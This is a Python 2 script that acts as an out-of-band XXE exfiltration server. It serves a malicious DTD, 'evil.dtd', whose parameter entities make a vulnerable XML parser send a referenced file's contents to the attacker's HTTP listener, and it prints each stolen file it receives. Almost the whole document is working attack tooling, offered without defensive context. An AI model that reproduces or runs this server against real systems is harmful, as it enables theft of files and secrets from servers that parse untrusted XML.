#!/usr/bin/env python

from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
from hashlib import sha1
import sys
import urllib

DTD_NAME = "evil.dtd"
DTD_TEMPLATE = """
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://{}:{}/?%file;'>">
%all;
%send;
"""

LAST_CONTENTS = ''

def makeCustomHandlerClass(dtd_name, dtd_contents):
    '''class factory method for injecting custom args into handler class. 
    see here for more info: http://stackoverflow.com/questions/21631799/how-can-i-pass-parameters-to-a-requesthandler'''
    class xxeHandler(BaseHTTPRequestHandler, object):
        def __init__(self, *args, **kwargs):
            self.DTD_NAME = dtd_name
            self.DTD_CONTENTS = dtd_contents
            super(xxeHandler, self).__init__(*args, **kwargs)
            
        def log_message(self, format, *args):
            '''overwriting this method to silence stderr output'''
            return
    
        def do_GET(self):
            if self.path.endswith(self.DTD_NAME): #need to actually serve DTD here
                mimetype = 'application/xml-dtd'
                self.send_response(200)
                self.send_header('Content-type',mimetype)
                self.end_headers()
                self.wfile.write(self.DTD_CONTENTS)
        
            else: #assume it's file contents and spit it out
                if self.path[0:2] == '/?': #hacky way to get rid of beginning chars
                    contents = self.path[2:]
                else:
                    contents = self.path
                displayContents(contents)
                self.send_response(200)
                self.end_headers()
                self.wfile.write("") #have to respond w/ something so it doesnt timeout
            
            return
        
    return xxeHandler #return class
    

def displayContents(contents):
    '''my hacky way to not display duplicate contents. 
    for some reason xml sends back to back requests
    and i only want to show the first one'''
    global LAST_CONTENTS
    newContents = sha1(contents).hexdigest()
    if LAST_CONTENTS != newContents:
        print "[+] Received response, displaying\n"
        print urllib.unquote(contents)
        LAST_CONTENTS = newContents
        print "------\n"
    return
    
  
def startServer(ip, port=8000):
    try:
        DTD_CONTENTS = DTD_TEMPLATE.format(ip, port)
        xxeHandler = makeCustomHandlerClass(DTD_NAME, DTD_CONTENTS )
        server = HTTPServer((ip, port), xxeHandler)
        print '[+] started server on {}:{}'.format(ip,port)
        print '[+] press Ctrl-C to close\n'
        server.serve_forever()

    except KeyboardInterrupt:
        print "\n...shutting down"
        server.socket.close()
        
def usage():
    print "Usage: {} <ip> <port>".format(sys.argv[0])

        
    